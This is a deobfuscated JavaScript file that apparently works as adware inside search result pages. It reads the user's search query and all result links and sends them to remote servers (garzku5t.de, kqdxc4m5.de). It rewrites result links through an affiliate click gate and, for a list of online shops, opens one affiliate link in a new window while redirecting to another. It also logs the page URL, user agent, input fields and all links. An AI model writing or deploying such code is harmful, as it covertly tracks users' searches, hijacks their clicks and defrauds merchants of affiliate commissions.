'use strict';
/** @type {null} */
var x2A_a = null;
/** @type {boolean} */
var x2A_b = false;
/** @type {string} */
var ao_subid = "";
/** @type {boolean} */
var x2A_c = false;
/** @type {string} */
var x8E_a = "rhyfsM17";
/** @type {string} */
var x8E_b = "fm7IYzdyyB";
/** @type {string} */
var x8E_c = "7uJGLqRaYx";
/** @type {string} */
var x8E_d = "res";
/** @type {string} */
var x8E_e = "q";
/** @type {string} */
var x8E_f = "tF2Cxc";
/** @type {number} */
var x8E_g = 0;
/** @type {string} */
var ao_j = "";
/** @type {!Array} */
var links = [];
/** @type {string} */
var ao_v = "";
/** @type {string} */
var ao_i = "k-f2";
/** @type {string} */
var ao_u = "";
/** @type {!Array} */
var ao_f = [];
/** @type {!Array} */
var ao_g = [];
/** @type {string} */
var click_url = "";
/** @type {number} */
var ao_l = Math.round((new Date).getTime() / 1000);
/** @type {!Array} */
var cpacpc_d = ["aboutyou.de", "adidas.de", "alternate.de", "atlasformen.de", "atlasformen.fr", "auto-doc.fr", "autodoc.de", "baur.de", "beautybay.com", "bergfreunde.de", "blancheporte.fr", "chewy.com", "decathlon.de", "douglas.de", "douglas.it", "emp.de", "fragrancex.com", "groupon.de", "groupon.fr", "ikea.com", "impericon.com", "intersport.de", "keenfootwear.com", "kohls.com", "laredoute.ch", "metro.de", "mmoga.de", "moosejaw.com", "mytoys.de", "norauto.fr", "officedepot.fr", "otto.de", "parfumdreams.de", 
"pureformulas.com", "replacements.com", "shoes.fr", "shop-apotheke.com", "shop-pharmacie.fr", "sneakersnstuff.com", "spartoo.com", "tchibo.de", "thomann.de", "vertbaudet.de", "vidaxl.fr", "yourhome.de", "zennioptical.com", "zoro.com", "brownells.com", "ashleystewart.com", "g2a.com"];
ao_b();
/**
 * @return {undefined}
 */
function ao_b() {
  /** @type {(Element|null)} */
  var bar_node = document.getElementById(x8E_d);
  if (bar_node == null || bar_node.getAttribute("ao_us_processed") != null) {
    /** @type {!NodeList<Element>} */
    var expRecords = document.getElementsByClassName(x8E_d);
    if (expRecords.length === 0) {
      ao_e(1);
      return;
    }
    /** @type {!Element} */
    bar_node = expRecords[0];
  }
  bar_node.setAttribute("ao_us_processed", "1");
  ao_c();
}
/**
 * @return {undefined}
 */
function ao_c() {
  /** @type {string} */
  ao_u = ao_j = "";
  /** @type {!Array} */
  ao_g = ao_f = [];
  if (document.getElementsByName(x8E_e).length > 0) {
    ao_v = document.getElementsByName(x8E_e)[0].value;
  } else {
    if (window.location.search.split("q=").length > 1 && window.location.search.split("q=")[1].split("&") > 0) {
      /** @type {string} */
      ao_v = window.location.search.split("q=")[1].split("&")[0];
    }
  }
  click_url = click_url + ("&q=" + encodeURIComponent(ao_v));
  /** @type {!NodeList<Element>} */
  var xml_parts = document.getElementsByClassName(x8E_f);
  /** @type {number} */
  i = 0;
  for (; i < xml_parts.length; i++) {
    /** @type {!NodeList<Element>} */
    var nodes = xml_parts[i].getElementsByTagName("a");
    /** @type {number} */
    j = 0;
    for (; j < nodes.length; j++) {
      nodes[j].setAttribute("ao_us_href", nodes[j].href);
      /** @type {null} */
      ao_g[nodes[j].host.replace("www.", "")] = null;
      links.push(nodes[j].href);
    }
  }
  if (xml_parts.length == 0) {
    ao_e(2);
    return;
  }
  for (k in ao_g) {
    /** @type {string} */
    ao_j = ao_j + (k + ",");
  }
  var validation_key = ao_a("k8ve" + x8E_c + ao_j + "D9v" + ao_i);
  ao_w("https://garzku5t.de/partner/api_v2/check/?p=" + x8E_c + "&k=" + validation_key + "&tld=" + ao_j + "&q=" + encodeURIComponent(ao_v), null, "GET").then(function(variables) {
    ao_u = variables["response"];
    ao_d();
  });
  validation_key = ao_a("k8ve" + x8E_c + links.concat(",") + "D9v" + ao_i);
  ao_w("https://garzku5t.de/partner/api_v3/check/", "p=" + x8E_c + "&k=" + validation_key + "&l=" + encodeURIComponent(links.concat(",")) + "&q=" + encodeURIComponent(ao_v), "POST").then(function(referenceFeatureObjs) {
    ao_d_cpc(referenceFeatureObjs);
  });
}
/**
 * @param {string} url
 * @param {string} data
 * @param {string} method
 * @return {?}
 */
function ao_w(url, data, method) {
  return new Promise(function(resolve) {
    /** @type {!XMLHttpRequest} */
    var xhr = new XMLHttpRequest;
    xhr.open(method, url, true);
    if (method === "POST") {
      xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    }
    /**
     * @return {undefined}
     */
    xhr.onload = function() {
      if (this.status === 200 || this.status === 304) {
        try {
          /** @type {*} */
          response = JSON.parse(xhr.responseText);
        } catch (e) {
          /** @type {!Array} */
          response = [];
        }
      }
      resolve(response);
    };
    /**
     * @return {undefined}
     */
    xhr.onerror = function() {
      resolve([]);
    };
    xhr.send(data);
  });
}
/**
 * @param {!Array} featureObjs
 * @return {undefined}
 */
function ao_d_cpc(featureObjs) {
  if (featureObjs.length <= 0) {
    ao_e(4);
    return;
  }
  /** @type {boolean} */
  var expRecords = false;
  /** @type {!NodeList<Element>} */
  var xml_parts = document.getElementsByClassName(x8E_f);
  /** @type {number} */
  i = 0;
  for (; i < xml_parts.length; i++) {
    /** @type {boolean} */
    expRecords = false;
    /** @type {!NodeList<Element>} */
    var links = xml_parts[i].getElementsByTagName("a");
    /** @type {string} */
    click_url = "https://utkv6nyu.de/redir/clickGate.php?u=" + x8E_a + "&m=12&p=" + x8E_b + "&t=33&splash=0&s=" + encodeURIComponent(ao_subid);
    /** @type {number} */
    j = 0;
    for (; j < links.length; j++) {
      featureObjs.some(function(data) {
        var url = links[j].href;
        if (data["url"] === url && !links[j].hasAttribute("ao_us_cpa_p")) {
          links[j].setAttribute("ao_us_href", data["click_url"]);
          /** @type {!Array} */
          expRecords = [links[0], data["logo"]];
        } else {
          if (data["url"] === url && links[j].hasAttribute("ao_us_cpa_p")) {
            links[j].setAttribute("ao_us_fk_l", data["click_url"]);
          }
        }
        if (data["url"] === url) {
          /**
           * @param {!Object} event
           * @return {undefined}
           */
          links[j].onmousedown = function(event) {
            if (this.hasAttribute("ao_us_fk_l") && cpacpc_d.includes(data["tld"])) {
              if ("button" in event && event.button !== 2 || !("button" in event)) {
                if (this.getAttribute("ao_us_href") !== this.getAttribute("ao_us_fk_l")) {
                  event.preventDefault();
                  window.open(click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href")));
                  /** @type {string} */
                  window.location = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_fk_l"));
                } else {
                  /** @type {string} */
                  this.href = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href"));
                }
              } else {
                /** @type {string} */
                this.href = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href"));
              }
            } else {
              /** @type {string} */
              this.href = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href"));
            }
          };
          return true;
        }
        return false;
      });
    }
    if (expRecords !== false && expRecords.length > 0) {
      ao_us_setIcon(expRecords[0], expRecords[1], "cpc");
      /** @type {boolean} */
      expRecords = false;
    }
  }
  ao_e(0);
}
/**
 * @return {undefined}
 */
function ao_d() {
  if (ao_u.length == 0 || ao_u == false) {
    ao_e(4);
    return;
  }
  /** @type {string} */
  click_url = "https://utkv6nyu.de/redir/clickGate.php?u=" + x8E_a + "&m=12&p=" + x8E_b + "&t=33&splash=0&s=" + encodeURIComponent(ao_subid);
  var array_param = ao_u.split(",");
  /** @type {boolean} */
  var expRecords = false;
  /** @type {!NodeList<Element>} */
  var xml_parts = document.getElementsByClassName(x8E_f);
  /** @type {number} */
  i = 0;
  for (; i < xml_parts.length; i++) {
    /** @type {boolean} */
    expRecords = false;
    /** @type {!NodeList<Element>} */
    var nodes = xml_parts[i].getElementsByTagName("a");
    /** @type {number} */
    j = 0;
    for (; j < nodes.length; j++) {
      /** @type {number} */
      k = 0;
      for (; k < array_param.length; k++) {
        var imscp = array_param[k].split("|");
        var value = nodes[j].host.replace("www.", "");
        if (imscp[0] == value) {
          if (nodes[j].hasAttribute("ao_us_href")) {
            nodes[j].setAttribute("ao_us_fk_l", nodes[j].getAttribute("ao_us_href"));
          }
          nodes[j].setAttribute("ao_us_href", nodes[j].href);
          /**
           * @param {!Object} event
           * @return {undefined}
           */
          nodes[j].onmousedown = function(event) {
            if (this.hasAttribute("ao_us_fk_l")) {
              if ("button" in event && event.button !== 2 || !("button" in event)) {
                if (this.getAttribute("ao_us_href") !== this.getAttribute("ao_us_fk_l")) {
                  event.preventDefault();
                  window.open(click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href")));
                  /** @type {string} */
                  window.location = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_fk_l"));
                } else {
                  /** @type {string} */
                  this.href = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href"));
                }
              } else {
                /** @type {string} */
                this.href = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href"));
              }
            } else {
              /** @type {string} */
              this.href = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href"));
            }
          };
          nodes[j].setAttribute("ao_us_cpa_p", "");
          /** @type {!Array} */
          expRecords = [nodes[0], imscp[2]];
          break;
        }
      }
    }
    if (expRecords !== false && expRecords.length > 0) {
      ao_us_setIcon(expRecords[0], "https://kqdxc4m5.de/logos_v2/90x45/" + expRecords[1] + ".gif", "cpa");
      /** @type {boolean} */
      expRecords = false;
    }
  }
  ao_e(0);
}
/**
 * @param {!Element} group
 * @param {string} twitterWidgetURL
 * @param {string} $q
 * @return {undefined}
 */
function ao_us_setIcon(group, twitterWidgetURL, $q) {
  /** @type {!Element} */
  var c = group;
  /**
   * @param {!Object} event
   * @return {?}
   */
  c.onmousedown = function(event) {
    if (this.hasAttribute("ao_us_fk_l")) {
      if ("button" in event && event.button !== 2 || !("button" in event)) {
        if (this.getAttribute("ao_us_href") !== this.getAttribute("ao_us_fk_l")) {
          event.preventDefault();
          window.open(click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href")));
          /** @type {string} */
          window.location = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_fk_l"));
        } else {
          /** @type {string} */
          this.href = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href"));
        }
      } else {
        /** @type {string} */
        this.href = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href"));
      }
    } else {
      /** @type {string} */
      this.href = click_url + "&url=" + encodeURIComponent(this.getAttribute("ao_us_href"));
    }
    return true;
  };
  /** @type {!Element} */
  var elem = document.createElement("a");
  elem.href = c.getAttribute("ao_us_href");
  elem.setAttribute("ao_us_href", c.getAttribute("ao_us_href"));
  /**
   * @param {!Object} event
   * @return {undefined}
   */
  elem.onmousedown = function(event) {
    if (c.hasAttribute("ao_us_fk_l")) {
      if ("button" in event && event.button !== 2 || !("button" in event)) {
        if (c.getAttribute("ao_us_href") !== c.getAttribute("ao_us_fk_l")) {
          event.preventDefault();
          window.open(click_url + "&url=" + encodeURIComponent(c.getAttribute("ao_us_href")));
          /** @type {string} */
          window.location = click_url + "&url=" + encodeURIComponent(c.getAttribute("ao_us_fk_l"));
        } else {
          /** @type {string} */
          this.href = click_url + "&url=" + encodeURIComponent(c.getAttribute("ao_us_href"));
        }
      } else {
        /** @type {string} */
        this.href = click_url + "&url=" + encodeURIComponent(c.getAttribute("ao_us_href"));
      }
    } else {
      /** @type {string} */
      this.href = click_url + "&url=" + encodeURIComponent(c.getAttribute("ao_us_href"));
    }
  };
  /** @type {string} */
  elem.target = "_blank";
  elem.setAttribute("ao_us_" + $q + "_p", "");
  /** @type {string} */
  elem.className = "ao_us_icon";
  /** @type {!Element} */
  var div = document.createElement("div");
  /** @type {string} */
  div.style.cssFloat = "left";
  /** @type {string} */
  div.style.paddingTop = "2px";
  /** @type {string} */
  div.style.paddingRight = "6px";
  /** @type {string} */
  div.innerHTML = "<img src='#' style='border:solid 1px #E6E6E6;padding:1px' border='1' width='90' height='45'/>";
  /** @type {string} */
  div.childNodes[0].src = twitterWidgetURL;
  elem.appendChild(div);
  if (x8E_g === 2) {
    group.parentNode.parentNode.childNodes.forEach(function(element) {
      if (element.className === "ao_us_cpc_p") {
        element.remove();
      }
    });
    group.parentNode.parentNode.insertBefore(elem, group.parentNode.nextSibling);
  } else {
    group.parentNode.childNodes.forEach(function(element) {
      if (element.className === "ao_us_cpc_p") {
        element.remove();
      }
    });
    group.parentNode.insertBefore(elem, group.nextSibling);
  }
}
/**
 * @param {number} start
 * @return {undefined}
 */
function ao_e(start) {
  /** @type {string} */
  var query = "";
  /** @type {string} */
  query = query + "&product=1";
  /** @type {string} */
  query = query + ("&loggingtype=" + start);
  /** @type {string} */
  query = query + ("&referer=" + encodeURIComponent(location.href));
  /** @type {string} */
  query = query + ("&tld=" + encodeURIComponent(location.hostname));
  /** @type {string} */
  query = query + ("&userAgent=" + encodeURIComponent(navigator.userAgent));
  /** @type {string} */
  query = query + ("&resolution=" + screen.availWidth + "x" + screen.availHeight);
  /** @type {string} */
  query = query + ("&memberhash=" + x8E_a);
  /** @type {string} */
  query = query + ("&panelhash=" + x8E_b);
  /** @type {string} */
  query = query + ("&apikey=" + x8E_c);
  /** @type {string} */
  query = query + ("&query=" + encodeURIComponent(ao_v));
  /** @type {string} */
  query = query + ("&loadtime=" + ao_l);
  /** @type {!Array} */
  var picmenu_list = [];
  /** @type {!NodeList<Element>} */
  var elemList = document.getElementsByTagName("input");
  /** @type {number} */
  var i = 0;
  for (; i < elemList.length; i++) {
    /** @type {!Element} */
    var elem = elemList[i];
    if (elem.type != "text" || elem.style.display == "none" || elem.style.visibility == "hidden") {
      continue;
    }
    picmenu_list.push([elem.name, elem.id, elem.className, elem.style.cssText]);
  }
  /** @type {string} */
  query = query + ("&inputfields=" + JSON.stringify(picmenu_list));
  /** @type {!Array} */
  var alwaysEnabledExtensionsData = [];
  /** @type {!NodeList<Element>} */
  var elems = document.getElementsByTagName("a");
  /** @type {number} */
  i = 0;
  for (; i < elems.length; i++) {
    /** @type {!Element} */
    elem = elems[i];
    if (elem.style.display == "none" || elem.style.visibility == "hidden") {
      continue;
    }
    alwaysEnabledExtensionsData.push([encodeURIComponent(elem.href), elem.id, elem.className]);
  }
  /** @type {string} */
  query = query + ("&sitelinks=" + JSON.stringify(alwaysEnabledExtensionsData));
  /** @type {!XMLHttpRequest} */
  var xhr = new XMLHttpRequest;
  xhr.open("POST", "https://kqdxc4m5.de/usLogging/l.php", true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send(query);
}
/**
 * @param {string} string
 * @return {?}
 */
function ao_a(string) {
  /**
   * @param {number} lValue
   * @param {number} iShiftBits
   * @return {?}
   */
  function RotateLeft(lValue, iShiftBits) {
    return lValue << iShiftBits | lValue >>> 32 - iShiftBits;
  }
  /**
   * @param {number} lX
   * @param {number} lY
   * @return {?}
   */
  function AddUnsigned(lX, lY) {
    var lX4;
    var lY4;
    var lX8;
    var lY8;
    var lResult;
    /** @type {number} */
    lX8 = lX & 2147483648;
    /** @type {number} */
    lY8 = lY & 2147483648;
    /** @type {number} */
    lX4 = lX & 1073741824;
    /** @type {number} */
    lY4 = lY & 1073741824;
    /** @type {number} */
    lResult = (lX & 1073741823) + (lY & 1073741823);
    if (lX4 & lY4) {
      return lResult ^ 2147483648 ^ lX8 ^ lY8;
    }
    if (lX4 | lY4) {
      if (lResult & 1073741824) {
        return lResult ^ 3221225472 ^ lX8 ^ lY8;
      } else {
        return lResult ^ 1073741824 ^ lX8 ^ lY8;
      }
    } else {
      return lResult ^ lX8 ^ lY8;
    }
  }
  /**
   * @param {number} x
   * @param {string} y
   * @param {string} z
   * @return {?}
   */
  function F(x, y, z) {
    return x & y | ~x & z;
  }
  /**
   * @param {number} d
   * @param {(Object|string)} a
   * @param {string} b
   * @return {?}
   */
  function G(d, a, b) {
    return d & b | a & ~b;
  }
  /**
   * @param {number} input
   * @param {number} x
   * @param {number} s
   * @return {?}
   */
  function H(input, x, s) {
    return input ^ x ^ s;
  }
  /**
   * @param {number} d
   * @param {number} a
   * @param {!Object} b
   * @return {?}
   */
  function I(d, a, b) {
    return a ^ (d | ~b);
  }
  /**
   * @param {number} a
   * @param {number} b
   * @param {string} c
   * @param {string} d
   * @param {undefined} x
   * @param {number} s
   * @param {number} ac
   * @return {?}
   */
  function FF(a, b, c, d, x, s, ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b, c, d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  }
  /**
   * @param {number} a
   * @param {number} b
   * @param {!Object} c
   * @param {string} d
   * @param {undefined} x
   * @param {number} s
   * @param {number} ac
   * @return {?}
   */
  function GG(a, b, c, d, x, s, ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b, c, d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  }
  /**
   * @param {number} a
   * @param {number} b
   * @param {number} c
   * @param {number} d
   * @param {undefined} x
   * @param {number} s
   * @param {number} ac
   * @return {?}
   */
  function HH(a, b, c, d, x, s, ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b, c, d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  }
  /**
   * @param {number} a
   * @param {number} b
   * @param {number} c
   * @param {!Object} d
   * @param {undefined} x
   * @param {number} s
   * @param {number} ac
   * @return {?}
   */
  function II(a, b, c, d, x, s, ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(I(b, c, d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  }
  /**
   * @param {string} string
   * @return {?}
   */
  function ConvertToWordArray(string) {
    var lWordCount;
    var lMessageLength = string.length;
    var lNumberOfWords_temp1 = lMessageLength + 8;
    /** @type {number} */
    var lNumberOfWords_temp2 = (lNumberOfWords_temp1 - lNumberOfWords_temp1 % 64) / 64;
    /** @type {number} */
    var lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16;
    /** @type {!Array} */
    var lWordArray = Array(lNumberOfWords - 1);
    /** @type {number} */
    var lBytePosition = 0;
    /** @type {number} */
    var lByteCount = 0;
    for (; lByteCount < lMessageLength;) {
      /** @type {number} */
      lWordCount = (lByteCount - lByteCount % 4) / 4;
      /** @type {number} */
      lBytePosition = lByteCount % 4 * 8;
      /** @type {number} */
      lWordArray[lWordCount] = lWordArray[lWordCount] | string.charCodeAt(lByteCount) << lBytePosition;
      lByteCount++;
    }
    /** @type {number} */
    lWordCount = (lByteCount - lByteCount % 4) / 4;
    /** @type {number} */
    lBytePosition = lByteCount % 4 * 8;
    /** @type {number} */
    lWordArray[lWordCount] = lWordArray[lWordCount] | 128 << lBytePosition;
    /** @type {number} */
    lWordArray[lNumberOfWords - 2] = lMessageLength << 3;
    /** @type {number} */
    lWordArray[lNumberOfWords - 1] = lMessageLength >>> 29;
    return lWordArray;
  }
  /**
   * @param {number} lValue
   * @return {?}
   */
  function WordToHex(lValue) {
    /** @type {string} */
    var WordToHexValue = "";
    /** @type {string} */
    var WordToHexValue_temp = "";
    var lByte;
    var lCount;
    /** @type {number} */
    lCount = 0;
    for (; lCount <= 3; lCount++) {
      /** @type {number} */
      lByte = lValue >>> lCount * 8 & 255;
      /** @type {string} */
      WordToHexValue_temp = "0" + lByte.toString(16);
      /** @type {string} */
      WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - 2, 2);
    }
    return WordToHexValue;
  }
  /**
   * @param {string} string
   * @return {?}
   */
  function Utf8Encode(string) {
    string = string.replace(/\r\n/g, "\n");
    /** @type {string} */
    var utftext = "";
    /** @type {number} */
    var i = 0;
    for (; i < string.length; i++) {
      var c = string.charCodeAt(i);
      if (c < 128) {
        /** @type {string} */
        utftext = utftext + String.fromCharCode(c);
      } else {
        if (c > 127 && c < 2048) {
          /** @type {string} */
          utftext = utftext + String.fromCharCode(c >> 6 | 192);
          /** @type {string} */
          utftext = utftext + String.fromCharCode(c & 63 | 128);
        } else {
          /** @type {string} */
          utftext = utftext + String.fromCharCode(c >> 12 | 224);
          /** @type {string} */
          utftext = utftext + String.fromCharCode(c >> 6 & 63 | 128);
          /** @type {string} */
          utftext = utftext + String.fromCharCode(c & 63 | 128);
        }
      }
    }
    return utftext;
  }
  /** @type {!Array} */
  var x = Array();
  var i;
  var AA;
  var BB;
  var CC;
  var DD;
  var a;
  var b;
  var c;
  var d;
  /** @type {number} */
  var S11 = 7;
  /** @type {number} */
  var S12 = 12;
  /** @type {number} */
  var S13 = 17;
  /** @type {number} */
  var S14 = 22;
  /** @type {number} */
  var S21 = 5;
  /** @type {number} */
  var S22 = 9;
  /** @type {number} */
  var S23 = 14;
  /** @type {number} */
  var S24 = 20;
  /** @type {number} */
  var S31 = 4;
  /** @type {number} */
  var S32 = 11;
  /** @type {number} */
  var S33 = 16;
  /** @type {number} */
  var S34 = 23;
  /** @type {number} */
  var S41 = 6;
  /** @type {number} */
  var S42 = 10;
  /** @type {number} */
  var S43 = 15;
  /** @type {number} */
  var S44 = 21;
  string = Utf8Encode(string);
  x = ConvertToWordArray(string);
  /** @type {number} */
  a = 1732584193;
  /** @type {number} */
  b = 4023233417;
  /** @type {number} */
  c = 2562383102;
  /** @type {number} */
  d = 271733878;
  /** @type {number} */
  i = 0;
  for (; i < x.length; i = i + 16) {
    AA = a;
    BB = b;
    CC = c;
    DD = d;
    a = FF(a, b, c, d, x[i + 0], S11, 3614090360);
    d = FF(d, a, b, c, x[i + 1], S12, 3905402710);
    c = FF(c, d, a, b, x[i + 2], S13, 606105819);
    b = FF(b, c, d, a, x[i + 3], S14, 3250441966);
    a = FF(a, b, c, d, x[i + 4], S11, 4118548399);
    d = FF(d, a, b, c, x[i + 5], S12, 1200080426);
    c = FF(c, d, a, b, x[i + 6], S13, 2821735955);
    b = FF(b, c, d, a, x[i + 7], S14, 4249261313);
    a = FF(a, b, c, d, x[i + 8], S11, 1770035416);
    d = FF(d, a, b, c, x[i + 9], S12, 2336552879);
    c = FF(c, d, a, b, x[i + 10], S13, 4294925233);
    b = FF(b, c, d, a, x[i + 11], S14, 2304563134);
    a = FF(a, b, c, d, x[i + 12], S11, 1804603682);
    d = FF(d, a, b, c, x[i + 13], S12, 4254626195);
    c = FF(c, d, a, b, x[i + 14], S13, 2792965006);
    b = FF(b, c, d, a, x[i + 15], S14, 1236535329);
    a = GG(a, b, c, d, x[i + 1], S21, 4129170786);
    d = GG(d, a, b, c, x[i + 6], S22, 3225465664);
    c = GG(c, d, a, b, x[i + 11], S23, 643717713);
    b = GG(b, c, d, a, x[i + 0], S24, 3921069994);
    a = GG(a, b, c, d, x[i + 5], S21, 3593408605);
    d = GG(d, a, b, c, x[i + 10], S22, 38016083);
    c = GG(c, d, a, b, x[i + 15], S23, 3634488961);
    b = GG(b, c, d, a, x[i + 4], S24, 3889429448);
    a = GG(a, b, c, d, x[i + 9], S21, 568446438);
    d = GG(d, a, b, c, x[i + 14], S22, 3275163606);
    c = GG(c, d, a, b, x[i + 3], S23, 4107603335);
    b = GG(b, c, d, a, x[i + 8], S24, 1163531501);
    a = GG(a, b, c, d, x[i + 13], S21, 2850285829);
    d = GG(d, a, b, c, x[i + 2], S22, 4243563512);
    c = GG(c, d, a, b, x[i + 7], S23, 1735328473);
    b = GG(b, c, d, a, x[i + 12], S24, 2368359562);
    a = HH(a, b, c, d, x[i + 5], S31, 4294588738);
    d = HH(d, a, b, c, x[i + 8], S32, 2272392833);
    c = HH(c, d, a, b, x[i + 11], S33, 1839030562);
    b = HH(b, c, d, a, x[i + 14], S34, 4259657740);
    a = HH(a, b, c, d, x[i + 1], S31, 2763975236);
    d = HH(d, a, b, c, x[i + 4], S32, 1272893353);
    c = HH(c, d, a, b, x[i + 7], S33, 4139469664);
    b = HH(b, c, d, a, x[i + 10], S34, 3200236656);
    a = HH(a, b, c, d, x[i + 13], S31, 681279174);
    d = HH(d, a, b, c, x[i + 0], S32, 3936430074);
    c = HH(c, d, a, b, x[i + 3], S33, 3572445317);
    b = HH(b, c, d, a, x[i + 6], S34, 76029189);
    a = HH(a, b, c, d, x[i + 9], S31, 3654602809);
    d = HH(d, a, b, c, x[i + 12], S32, 3873151461);
    c = HH(c, d, a, b, x[i + 15], S33, 530742520);
    b = HH(b, c, d, a, x[i + 2], S34, 3299628645);
    a = II(a, b, c, d, x[i + 0], S41, 4096336452);
    d = II(d, a, b, c, x[i + 7], S42, 1126891415);
    c = II(c, d, a, b, x[i + 14], S43, 2878612391);
    b = II(b, c, d, a, x[i + 5], S44, 4237533241);
    a = II(a, b, c, d, x[i + 12], S41, 1700485571);
    d = II(d, a, b, c, x[i + 3], S42, 2399980690);
    c = II(c, d, a, b, x[i + 10], S43, 4293915773);
    b = II(b, c, d, a, x[i + 1], S44, 2240044497);
    a = II(a, b, c, d, x[i + 8], S41, 1873313359);
    d = II(d, a, b, c, x[i + 15], S42, 4264355552);
    c = II(c, d, a, b, x[i + 6], S43, 2734768916);
    b = II(b, c, d, a, x[i + 13], S44, 1309151649);
    a = II(a, b, c, d, x[i + 4], S41, 4149444226);
    d = II(d, a, b, c, x[i + 11], S42, 3174756917);
    c = II(c, d, a, b, x[i + 2], S43, 718787259);
    b = II(b, c, d, a, x[i + 9], S44, 3951481745);
    a = AddUnsigned(a, AA);
    b = AddUnsigned(b, BB);
    c = AddUnsigned(c, CC);
    d = AddUnsigned(d, DD);
  }
  var currentNick = WordToHex(a) + WordToHex(b) + WordToHex(c) + WordToHex(d);
  return currentNick.toLowerCase();
}
/**
 * @return {undefined}
 */
function setPlink() {
}
;
